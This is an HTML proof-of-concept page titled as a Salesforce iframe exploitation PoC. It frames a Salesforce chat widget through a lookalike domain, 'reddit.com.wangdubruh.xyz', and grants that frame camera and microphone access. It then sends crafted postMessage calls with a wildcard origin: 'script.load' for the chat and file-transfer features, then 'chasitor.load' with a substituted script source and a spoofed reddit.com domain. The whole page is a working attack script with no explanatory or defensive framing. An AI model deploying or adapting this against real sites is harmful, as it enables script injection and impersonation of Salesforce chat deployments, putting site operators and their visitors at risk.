<!DOCTYPE html>
<html>
<head>
  <title>Salesforce Iframe Exploitation PoC</title>
</head>
<body>
  <h2>Salesforce PoC - chasitor.load simulation</h2>

  <iframe
    id="eswFrame"
    src="https://reddit.com.wangdubruh.xyz"  <!-- Your proxied ESW 4.0 iframe -->
    onload="runPoC()"
    style="width:600px;height:400px;border:1px solid black"
    allow="camera *; microphone *;"
  ></iframe>

  <script>
    function runPoC() {
      console.log("[+] Iframe loaded (Salesforce 4.0)");

      const iframe = document.getElementById("eswFrame").contentWindow;

      // Send script.load for features
      ["chasitor", "filetransfer"].forEach(feature => {
        console.log(`ðŸ“¤ Sending script.load for feature: ${feature}`);
        iframe.postMessage({ method: "script.load", feature }, "*");
      });

      // Simulated chasitor.load payload with mock settings
      setTimeout(() => {
        const mockSettings = {
          settingsObj: {
            chasitorSrc: "https://service.force.com/embeddedservice/5.0/esw.min.js",
            endpointURL: "https://d.la2-c1cs-ia4.salesforceliveagent.com/chat",
            contentServerURL: "https://c.la2-c1cs-ia4.salesforceliveagent.com/content",
            orgId: "00Dxx0000001gEREAY",  // fake org
            deploymentId: "572xx000000L6gRAAS", // fake deployment
            buttonId: "573xx000000L6gRAAS", // fake button
            visitorInfo: { visitCount: 1, originalReferrer: "https://reddit.com", pages: [] }
          },
          hasOnlyExtraPrechatInfo: false,
          prechatFormDetails: [],
          prechatEntities: []
        };

        console.log("ðŸ“¤ Sending chasitor.load with mock settings");
        iframe.postMessage({
          method: "chasitor.load",
          domain: "reddit.com.wangdubruh.xyz",
          data: mockSettings
        }, "*");
      }, 1000);
    }
  </script>
</body>
</html>
